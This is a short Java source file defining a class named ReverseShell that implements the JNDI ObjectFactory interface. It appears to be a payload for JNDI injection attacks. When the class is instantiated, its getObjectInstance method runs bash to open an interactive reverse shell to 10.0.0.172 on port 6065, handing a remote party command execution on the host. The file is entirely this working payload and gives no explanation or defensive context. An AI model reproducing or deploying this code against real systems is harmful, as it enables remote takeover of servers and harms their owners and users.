import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class ReverseShell implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)
            throws Exception {
        String[] cmd = {
                "/bin/bash",
                "-c",
                "bash -i >& /dev/tcp/10.0.0.172/6065 0>&1"
        };

        Runtime.getRuntime().exec(cmd);

        return null;
    }
}
